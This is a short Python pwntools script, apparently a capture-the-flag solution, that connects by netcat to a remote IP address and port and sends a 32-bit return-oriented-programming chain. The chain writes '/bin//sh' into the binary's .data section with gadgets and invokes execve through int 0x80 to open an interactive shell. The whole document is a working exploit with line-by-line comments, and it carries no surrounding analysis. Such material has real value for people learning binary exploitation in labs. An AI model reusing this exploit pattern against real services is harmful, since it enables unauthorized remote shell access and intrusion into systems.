from pwn import *

p = process(['/usr/bin/nc', '45.122.249.68', '10009'])


# pop eax ; pop edx ; pop ebx ret
pop_eax_edx_ebx_ret = 0x08056334
# pop ecx ; pop ebx ; ret
pop_ecx_ebx_ret = 0x0806ee92
# systemcall
int_0x80 = 0x08049563
# pop edx ; ret
pop_edx_ret = 0x0806ee6b
# xor eax, eax ; ret
xor_eax_ret = 0x08056420
# mov dword ptr [edx], eax ; ret
mov_eax_mem_edx_ret = 0x08056e65
# address of binsh (.data section)
binsh = 0x080da060

# padding 0x1c bytes
payload = b'A'*28

# add "/bin" into data section
# put "/bin" in eax (e*x registers can contain 4 bytes)
payload += p32(pop_eax_edx_ebx_ret); payload += b"/bin"
# point edx to the start of data section and dump value for ebx
payload += p32(binsh); payload += p32(0)
# move eax value to the memory where edx point
payload += p32(mov_eax_mem_edx_ret)
# insert "//sh" into eax (4 bytes, shell accepts /bin//sh)
payload += p32(pop_eax_edx_ebx_ret); payload += b'//sh'
# point edx to next 4 bytes in order to insert "/sh" string
payload += p32(binsh + 4); payload += p32(0)
# insert "//sh" into memory after string "/bin"
payload += p32(mov_eax_mem_edx_ret)
# point edx to next 4 byte (to insert null terminated after string "/bin//sh")
payload += p32(pop_edx_ret); payload += p32(binsh + 8)
# xor eax eax to make eax = 0 (null)
payload += p32(xor_eax_ret)
# move null byte to after "/bin/sh "
payload += p32(mov_eax_mem_edx_ret)
# send exploit payload like ROP_Basic
payload += p32(pop_eax_edx_ebx_ret)
payload += p32(0xb)
payload += p32(0)
payload += p32(binsh)
payload += p32(pop_ecx_ebx_ret)
payload += p32(0)
payload += p32(binsh)
payload += p32(int_0x80)

# send payload to process
p.sendline(payload)
# interact with process
p.interactive()
